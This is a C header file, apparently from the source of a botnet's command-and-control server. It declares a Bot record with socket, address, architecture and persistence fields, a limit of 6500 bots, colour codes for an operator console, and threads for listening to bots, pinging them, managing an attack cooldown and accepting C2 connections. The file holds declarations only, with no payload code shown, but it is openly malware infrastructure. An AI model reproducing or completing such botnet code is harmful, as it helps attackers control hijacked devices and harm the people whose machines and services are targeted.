#ifndef BOTNET_H
#define BOTNET_H

#include <arpa/inet.h>
#include <pthread.h>
#include "login_utils.h"
#include "checks.h"

#define MAX_BOTS 6500
#define MAX_COMMAND_LENGTH 2048
#define LIGHT_BLUE "\033[1;34m"
#define YELLOW "\033[1;33m"
#define RESET "\033[0m"
#define RED "\033[1;31m"
#define BLUE "\033[1;34m"
#define LIGHT_PINK "\033[1;95m"
#define NEON "\033[1;96m"
#define PINK "\033[1;35m"
#define GREEN "\033[1;32m"

typedef struct {
    int socket;
    struct sockaddr_in address;
    int is_valid;
    char arch[20];
    int is_persistent;
    int status_reported;
} Bot;

extern Bot bots[MAX_BOTS];
extern int bot_count;
extern int global_cooldown;
extern pthread_mutex_t bot_mutex;
extern pthread_mutex_t cooldown_mutex;

void* handle_bot(void* arg);
void* bot_listener(void* arg);
void* ping_bots(void* arg);
void* manage_cooldown(void* arg);
void* cnc_listener(void* arg);

#endif
